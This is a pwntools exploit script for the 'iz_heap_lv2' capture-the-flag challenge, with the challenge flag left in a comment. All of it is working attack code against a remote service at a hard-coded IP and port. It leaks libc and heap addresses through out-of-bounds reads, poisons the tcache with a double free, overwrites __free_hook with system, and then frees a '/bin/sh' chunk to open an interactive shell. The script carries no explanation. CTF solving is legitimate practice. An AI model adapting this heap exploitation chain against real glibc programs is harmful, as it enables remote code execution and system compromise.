from pwn import *
def cmd(c):
	p.sendlineafter(": \n",str(c))
def add(size,c):
	cmd(1)
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
def free(idx):
	cmd(3)
	p.sendlineafter(": ",str(idx))
def edit(idx,size,c):
	cmd(2)
	p.sendlineafter(": ",str(idx))
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
def show(idx):
	cmd(4)
	p.sendlineafter(": ",str(idx))
def index(add):
	return (add-0x000000000602040)/8
context.log_level='debug'
libc=ELF("./libc.so.6")
#libc=ELF("./iz_heap_lv2").libc
#p=process("./iz_heap_lv2")
#p=process('./iz_heap_lv2',env={"LD_PRELOAD":"./libc.so.6"})
p=remote("165.22.110.249",4444)

add(0x000000000601fa0,"n132")#0
show(index(0x0000000006020e0))
p.readuntil(": ")
base=u64(p.readline()[:-1].ljust(8,'\x00'))-libc.sym['puts']
log.warning(hex(base))
add(0x88,"n132")#1
add(0x000000000602048,"n132")#2

show(index(0x0000000006020f0))
p.readuntil(": ")
heap=u64(p.readline()[:-1].ljust(8,'\x00'))
log.warning(hex(heap))


add(heap,"n132")#3
free(index(0x0000000006020f8))
free(1)

libc.address=base
add(0x88,p64(libc.sym['__free_hook']))
add(0x88,'/bin/sh\x00')
add(0x88,p64(libc.sym['system']))
free(4)
#gdb.attach(p,'b *0x000000000400C05')
#ISITDTU{TcAch3_C4ch3_F1LL1Ng_UnL1NKKKKKK_1Z_h34P_LvTw0}  


p.interactive()
